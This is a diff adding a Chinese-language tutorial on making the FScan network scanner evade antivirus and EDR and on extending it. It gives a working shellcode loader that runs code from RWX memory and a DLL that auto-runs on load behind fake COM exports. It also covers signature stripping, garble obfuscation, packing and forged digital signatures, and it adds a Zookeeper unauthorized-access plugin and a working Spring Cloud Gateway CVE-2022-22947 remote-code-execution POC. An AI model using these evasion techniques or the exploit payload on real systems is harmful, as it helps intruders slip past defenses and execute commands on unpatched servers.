@@ -1,0 +1,397 @@
+## 1. 概述
+
+本文档旨在深入探讨知名内网扫描工具 FScan 的免杀对抗技术与二次开发实践。FScan 因其强大的自动化漏洞扫描能力而广受安全从业者欢迎，但其明显的特征也使其容易被各类终端安全产品（EDR/AV）检测。本笔记将从源码层面出发，系统性地介绍如何对 FScan 进行改造，以绕过常规检测，并进一步探讨如何扩展其功能，实现自定义漏洞扫描。
+
+内容将涵盖以下核心技术点：
+- **ShellCode 分离加载**：将 PE 文件转换为 ShellCode，实现内存加载，规避文件落地检测。
+- **DLL 分离加载**：通过将核心功能编译为 DLL，并利用 COM 导出函数特性实现隐蔽加载。
+- **源码静态特征消除**：修改包名、清除特征字符串，并利用 `garble` 工具进行深度混淆。
+- **功能魔改与二次开发**：剖析 FScan 插件机制，通过实战案例演示如何添加新的服务扫描插件和自定义 POC。
+
+本笔记结合了理论分析与可复现的实战代码，旨在为安全研究人员和红队工程师提供一套完整的 FScan 免杀与定制化方案。
+
+## 2. 技术原理
+
+### 2.1 分离加载技术
+
+分离加载是一种核心的免杀思想，其目的是将恶意或敏感的功能代码（Payload）与加载器（Loader）分离开。加载器本身只包含最少的、无害的代码（如文件读取、内存申请），而真正的功能代码则以加密或编码的形式存储在外部文件、网络资源甚至注册表中。在运行时，加载器动态地将功能代码载入内存并执行。
+
+- **ShellCode 加载**：将完整的 PE 文件（如 `.exe`）通过特定工具（如 `donut`）转换为位置无关的 ShellCode。这种 ShellCode 是一段纯粹的机器码，可以直接在内存中执行，从而避免了在磁盘上创建完整的 PE 文件，极大地降低了被静态扫描的风险。
+- **DLL 加载**：将核心功能编译成动态链接库（DLL）。加载器在运行时加载此 DLL。为了进一步隐蔽，可以利用 DLL 的导出函数机制。例如，通过导出标准的 COM 接口函数（如 `DllCanUnloadNow`, `DllGetClassObject`），并把初始化代码放在 `DllMain` 或 Go 的 `init()` 函数中。当加载器尝试调用这些看似无害的导出函数时，真正的扫描功能就会被自动触发。
+
+### 2.2 源码级特征消除
+
+杀毒软件通常依赖于静态特征库来识别恶意软件。对于像 FScan 这样开源的工具，其源码中的特定字符串、包名、函数名等都可能成为被查杀的“指纹”。
+
+- **字符串与变量名修改**：直接修改源码中具有高辨识度的字符串，如工具名称 "FScan"、作者信息、默认输出文件名 "fscanapi.csv" 等。
+- **包路径混淆**：Go 语言项目中的 `go.mod` 文件定义了模块路径，如 `github.com/shadow1ng/fscan`。这是一个极强的特征。通过修改模块路径并同步更新所有 `import` 语句，可以有效消除这一特征。
+- **自动化混淆编译**：使用 `garble` 这类工具可以在编译时自动对 Go 程序的包名、函数名、变量名甚至字符串字面量进行随机化、无意义的替换。这使得逆向分析变得极其困难，并能有效破坏基于符号名的检测规则。
+
+## 3. 环境准备
+
+在开始实战之前，请确保您的开发环境中已安装以下工具：
+
+- **Go 语言环境**：用于编译 FScan 源码及加载器。
+- **GCC 编译器**：用于编译 C 语言编写的加载器（如 MinGW）。
+- **Donut**：用于将 PE 文件转换为 ShellCode。
+  - GitHub: `https://github.com/TheWover/donut`
+- **Garble**：用于混淆 Go 源码。
+  - 安装命令：
+    ```bash
+    go env -w GOPROXY=https://goproxy.cn,direct
+    go install mvdan.cc/garble@latest
+    ```
+- **FScan 源码**：
+  - GitHub: `https://github.com/shadow1ng/fscan`
+
+## 4. 实战示例
+
+### 4.1 ShellCode 分离加载
+
+此方法将 FScan 编译后的 `.exe` 文件转换为 ShellCode，并由一个独立的加载器在内存中执行。
+
+**步骤 1：编译原始 FScan 程序**
+首先，我们编译一个基础版本的 FScan，以便后续转换为 ShellCode。
+
+```bash
+# 进入 FScan 源码目录
+cd fscan-main
+# 使用 -s -w 参数去除符号信息和调试信息，减小体积
+go build -ldflags="-s -w" -trimpath main.go
+```
+
+**步骤 2：使用 Donut 生成 ShellCode**
+使用 `donut.exe` 将上一步生成的 `main.exe` 转换为二进制的 ShellCode 文件 `fscan.bin`。
+
+- `-i`: 输入的 PE 文件。
+- `-o`: 输出的 ShellCode 文件。
+- `-a 2`: 指定目标架构为 x64。
+- `-f 1`: 指定输出格式为二进制文件。
+
+```bash
+# 假设 donut.exe 和 main.exe 在同一目录下
+donut.exe -i main.exe -o fscan.bin -a 2 -f 1
+```
+
+**步骤 3：编写并编译 ShellCode 加载器**
+创建一个 C 语言加载器 (`loader.c`)，它负责读取 `fscan.bin` 文件内容，申请一段可执行内存，并将 ShellCode 复制进去执行。
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <shellcode_file>\n", argv[0]);
+        return 1;
+    }
+
+    FILE *file = fopen(argv[1], "rb");
+    if (!file) {
+        perror("Failed to open file");
+        return 1;
+    }
+
+    fseek(file, 0, SEEK_END);
+    long size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    char *buffer = (char *)malloc(size);
+    if (!buffer) {
+        fclose(file);
+        perror("Failed to allocate memory for shellcode");
+        return 1;
+    }
+
+    fread(buffer, 1, size, file);
+    fclose(file);
+
+    void *exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+        free(buffer);
+        perror("Failed to allocate executable memory");
+        return 1;
+    }
+
+    memcpy(exec_mem, buffer, size);
+    free(buffer);
+
+    // 创建一个新线程来执行 ShellCode
+    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    if (thread) {
+        WaitForSingleObject(thread, INFINITE); // 等待扫描任务完成
+        CloseHandle(thread);
+    }
+
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    return 0;
+}
+```
+
+**步骤 4：编译并执行**
+使用 GCC 编译加载器，并运行它来加载 ShellCode。
+
+```bash
+gcc -o loader.exe loader.c
+# 执行加载器，fscan.bin 是 donut 生成的 ShellCode 文件
+# 可以在后面跟上 FScan 的参数，如 -h 127.0.0.1
+loader.exe fscan.bin -h 127.0.0.1
+```
+
+> **关键点**：为了让加载器能够接收并传递 FScan 的命令行参数，需要对 ShellCode 生成过程和加载器代码进行优化，使其能够处理 `argc` 和 `argv`。
+
+### 4.2 DLL 分离加载
+
+此方法将 FScan 的核心功能编译成一个 DLL，并利用其导出函数特性来触发执行。
+
+**步骤 1：修改 Go 源码以编译为 DLL**
+在 FScan 的 `main` 包中，我们需要导出几个函数，以便加载器可以调用。Go 语言通过 `//export` 注释来实现函数导出。同时，利用 Go 的 `init()` 函数特性，在 DLL 被加载时自动执行扫描逻辑。
+
+```go
+// main.go
+package main
+
+/*
+#include <stdio.h>
+#include <windows.h>
+
+// 声明一个函数指针类型，用于传递参数
+typedef void (*ArgHandler)(int, char**);
+
+// 代理函数，用于在 C 环境中调用 Go 的参数处理函数
+void handleArgs(ArgHandler handler, int argc, char** argv) {
+    handler(argc, argv);
+}
+*/
+import "C"
+import (
+    "fmt"
+    "os"
+    "strings"
+    // ... 其他 FScan 的 imports
+)
+
+// 这个 init 函数会在 DLL 加载时自动运行
+func init() {
+    // 这里可以放置 FScan 的主要启动逻辑
+    // 例如解析命令行参数并开始扫描
+    fmt.Println("[+] DLL loaded, FScan logic is executing...")
+    // 简单的示例：获取命令行参数并执行
+    args := os.Args
+    // 在 DLL 模式下，os.Args 可能不直接包含我们想要的参数
+    // 需要通过其他方式传递，或者硬编码
+    fmt.Printf("Args received: %v\n", args)
+    // 在这里调用 FScan 的核心扫描函数
+    // core.Start(args)
+}
+
+// //export DllCanUnloadNow
+// func DllCanUnloadNow() {}
+
+// //export DllGetClassObject
+// func DllGetClassObject() {}
+
+// //export DllRegisterServer
+// func DllRegisterServer() {}
+
+// //export DllUnregisterServer
+// func DllUnregisterServer() {}
+
+// main 函数在 buildmode=c-shared 模式下是必需的，但不会被直接调用
+func main() {}
+```
+
+**步骤 2：编译为 DLL**
+使用 `buildmode=c-shared` 将 Go 代码编译成一个 C 风格的共享库（在 Windows 上即为 DLL）。
+
+```bash
+go build -buildmode=c-shared -o fscan.dll ./main.go
+```
+
+**步骤 3：编写 DLL 加载器**
+创建一个简单的 C 程序 (`dll_loader.c`) 来加载 `fscan.dll`。
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    HMODULE hDll = LoadLibrary("fscan.dll");
+    if (hDll == NULL) {
+        printf("Failed to load DLL. Error code: %lu\n", GetLastError());
+        return 1;
+    }
+
+    printf("DLL 'fscan.dll' loaded successfully.\n");
+    printf("FScan logic should have been triggered via init().\n");
+
+    // 可以在这里停留一段时间，或者等待某个事件，以确保扫描完成
+    Sleep(30000); // 等待 30 秒
+
+    FreeLibrary(hDll);
+    printf("DLL unloaded.\n");
+    return 0;
+}
+```
+
+**步骤 4：编译并执行**
+
+```bash
+gcc -o dll_loader.exe dll_loader.c
+# 执行加载器，它会自动加载 fscan.dll 并触发 init() 函数
+dll_loader.exe
+```
+
+### 4.3 源码静态特征消除
+
+这是免杀处理中最关键的一步，目的是让 FScan 从“外观”上不再像 FScan。
+
+**步骤 1：修改包名**
+打开 `go.mod` 文件，将模块路径从 `module github.com/shadow1ng/fscan` 修改为一个自定义的、无意义的名称。
+
+```diff
+- module github.com/shadow1ng/fscan
++ module my-secret-scanner
+```
+
+然后，使用 IDE 或脚本工具，将项目中所有 `import` 语句中的 `"github.com/shadow1ng/fscan"` 替换为 `"my-secret-scanner"`。
+
+**步骤 2：清除特征关键字**
+在整个项目中搜索并替换掉所有可识别的特征字符串：
+- `Flag.go`: 修改帮助信息中的 "Fscan Version" 为 "Scanner Version"。
+- `Flag.go`: 替换或删除 ASCII 艺术字 `lines := []string{...}`。
+- `Common/Output.go`: 修改默认输出文件名 `fscanapi.csv` 为 `result.dat`。
+- `Plugins/MiniDump.go`: 修改 `fmt.Sprintf("fscan-%d.dmp", pid)` 为 `fmt.Sprintf("dump-%d.dmp", pid)`。
+
+**步骤 3：使用 Garble 深度混淆**
+`garble` 是一个强大的 Go 源码混淆器。它能将函数名、变量名、字符串等替换为随机字符，极大提升逆向难度。
+
+```bash
+# 确保依赖已经更新
+go mod tidy
+
+# 使用 garble 进行编译
+# -seed=random: 使用随机种子，确保每次编译结果都不同
+# -literals: 混淆字符串字面量
+# -o: 指定输出文件名
+garble -seed=random -literals build -o scanner.exe main.go
+```
+
+编译完成后，可以使用 PE 分析工具（如 PE-bear）对比 `scanner.exe` 和原始的 `main.exe`，会发现函数名、字符串等特征已几乎完全消失。
+
+**步骤 4：后续增强（可选）**
+- **加壳**：使用 UPX 或其他更高级的壳对编译后的程序进行压缩和加密。
+- **添加数字签名**：为程序伪造一个合法的数字签名，可以提高某些安全软件的信任度。
+- **修改 PE 信息**：添加版本信息、公司名称等，使其看起来更像一个正常的商业软件。
+
+## 5. 功能魔改与二次开发
+
+FScan 2.x 版本拥有一个统一的插件注册机制，使得添加新功能变得非常方便。
+
+### 5.1 添加 Zookeeper 未授权访问扫描插件
+
+**步骤 1：创建插件文件**
+在 `Plugins/` 目录下新建 `zookeeper.go` 文件。插件函数必须接收一个 `*Common.HostInfo` 参数并返回一个 `error`。
+
+```go
+// Plugins/zookeeper.go
+package Plugins
+
+import (
+	"fmt"
+	"time"
+	// 注意：这里的包路径需要替换成你在 go.mod 中修改后的路径
+	"my-secret-scanner/Common" 
+	"github.com/samuel/go-zookeeper/zk"
+)
+
+func ZookeeperScan(info *Common.HostInfo) error {
+	addr := fmt.Sprintf("%s:%v", info.Host, info.Ports)
+	// 设置一个较短的超时时间
+	conn, _, err := zk.Connect([]string{addr}, time.Second*5)
+	if err != nil {
+		// 连接失败，说明可能不存在漏洞或服务不通，返回错误即可
+		return err
+	}
+	defer conn.Close()
+
+	// 如果连接成功，说明存在未授权访问
+	result := fmt.Sprintf("Zookeeper unauthorized access at %s", addr)
+	Common.LogSuccess(result)
+	return nil // 返回 nil 表示扫描成功且发现漏洞
+}
+```
+
+**步骤 2：注册插件**
+打开 `Core/Registry.go` 文件，在 `init()` 函数中调用 `Common.RegisterPlugin` 来注册我们的新插件。
+
+```go
+// Core/Registry.go
+func init() {
+    // ... 其他已有的插件注册 ...
+
+    Common.RegisterPlugin("zookeeper", Common.ScanPlugin{
+        Name:     "Zookeeper",
+        Ports:    []int{2181}, // 插件关联的端口
+        ScanFunc: Plugins.ZookeeperScan, // 关联扫描函数
+        Types:    []string{Common.PluginTypeService}, // 插件类型
+    })
+}
+```
+
+完成以上步骤后，重新编译 FScan。当它扫描到开放 2181 端口的主机时，就会自动调用 `ZookeeperScan` 函数进行检测。
+
+### 5.2 添加自定义 YAML POC (CVE-2022-22947)
+
+FScan 支持通过 YAML 文件来定义 Web 漏洞的 POC。我们只需按照格式编写 YAML 文件并将其放入 `pocs/` 目录下即可。
+
+**示例：`poc-cve-2022-22947.yaml`**
+
+```yaml
+name: poc-yaml-spring-cloud-gateway-cve-2022-22947
+rules:
+  - method: POST
+    path: /actuator/gateway/routes/hacktest
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id": "hacktest",
+        "filters": [{
+          "name": "AddResponseHeader",
+          "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
+        }],
+        "uri": "http://example.com"
+      }
+    expression: response.status == 201
+
+  - method: POST
+    path: /actuator/gateway/refresh
+    headers:
+      Content-Type: application/json
+    body: ''
+    expression: response.status == 200
+
+  - method: GET
+    path: /actuator/gateway/routes/hacktest
+    headers: {}
+    body: ''
+    expression: response.status == 200 && response.headers['Result'].contains("uid=")
+
+detail:
+  author: YourName
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/spring/cve-2022-22947
+```
+
+将此文件保存到 `pocs/` 目录下，FScan 在进行 Web 扫描时会自动加载并使用这个 POC 进行测试。
+
+## 6. 安全总结
+
+本次实践展示了一套完整的针对开源安全工具的免杀与功能扩展流程。核心思想在于**消除一切可被识别的静态与行为特征**，并**将自身能力融入到目标环境中**。
+
+- **免杀不是单一技术，而是组合拳**：单纯的加壳或修改字符串很容易被现代 EDR 的行为分析引擎识破。必须结合分离加载、内存执行、源码混淆、通信加密（未在本文详述）等多种手段，构建多层防御绕过体系。
+- **理解工具原理是定制化的前提**：只有深入理解 FScan 的插件机制和工作流程，才能精准地进行二次开发，添加符合实战需求的新功能，使其成为一把真正定制化的利器。
+- **对抗是持续演进的**：本文提供的技术在当前可能有效，但随着检测技术的发展，未来可能会失效。安全研究人员需要不断学习新的攻防技巧，持续迭代自己的工具库。
+
+---
